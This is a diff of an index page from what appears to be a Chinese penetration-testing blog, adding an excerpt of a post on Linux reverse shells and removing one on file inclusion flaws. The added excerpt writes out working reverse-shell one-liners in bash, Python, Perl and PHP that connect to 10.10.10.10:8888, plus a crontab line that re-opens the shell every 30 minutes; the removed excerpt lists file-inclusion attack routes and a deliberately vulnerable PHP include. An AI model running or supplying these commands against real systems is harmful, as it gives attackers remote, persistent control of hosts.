@@ -82,6 +82,60 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/linux-bounce-shell/">Linux下反弹shell</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-08-06</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/elevate-privileges">elevate privileges</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
+0x00 Bash /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1 注：这个由解析shell的bash完成，有些时候不支持  0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9; exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)| crontab -  0x02 Python # 下面为1条命令 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'  0x03 Perl # 下面为1条命令 perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'  0x04 PHP php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'  0x05 Ruby # 下面为1条命令 ruby -rsocket -e'f=TCPSocket.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/linux-bounce-shell/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/">Dedecms远程写文件漏洞</a></h2>
 
         
@@ -554,59 +608,6 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/file-include-vulnerabilities/">文件包含漏洞</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-26</time>
-            </div>
-
-            
-
-            <div style="padding:2px 5px 2px 0px;">
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 文件包含   程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件， 而无需再次编写，这中文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用， 但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多, 而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。 在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。   0x01 常见文件包含函数  include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含   0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量   注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径   0x03 漏洞危害  执行任意代码 包含恶意文件控制网站 甚至控制服务器   0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码 上传图片马，然后包含 读敏感文件，读PHP文件 包含日志文件GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件 远程文件包含：可以直接执行任意代码 要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS吧，骚年...   0x06 本地包含  示例一   &lt;?php if (@$_GET['page']) { include($_GET['page']); } else { include &quot;show.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/file-include-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -640,7 +641,7 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/ajax" title="ajax">ajax(3)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/database" title="database">database(7)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/database" title="database">database(8)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/git" title="git">git(6)</a></li>
         
@@ -822,6 +823,11 @@ fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/sqlmap" title="sqlmap">sqlmap</a>
                 <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>1</sup>
             </p>
         
             <p style="display:inline-block;">
